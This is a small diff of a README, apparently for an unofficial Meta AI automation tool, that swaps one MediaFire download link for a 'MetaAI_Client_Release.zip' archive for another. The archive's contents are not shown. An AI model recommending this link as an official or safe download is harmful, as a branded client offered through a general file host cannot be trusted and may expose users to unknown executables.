@@ -9,7 +9,7 @@ Official repository for META AI automation tool website.
 ### 📥 Download
 
 - **MetaAI Client (Main Application)**:  
-  [Download MetaAI_Client_Release.zip](https://www.mediafire.com/file/y7o2hp3qgcyza3c/MetaAI_Client_Release.zip/file)
+  [Download MetaAI_Client_Release.zip](https://www.mediafire.com/file/9qjyhgaiw5w9sxa/MetaAI_Client_Release.zip/file)
 
 ---
 
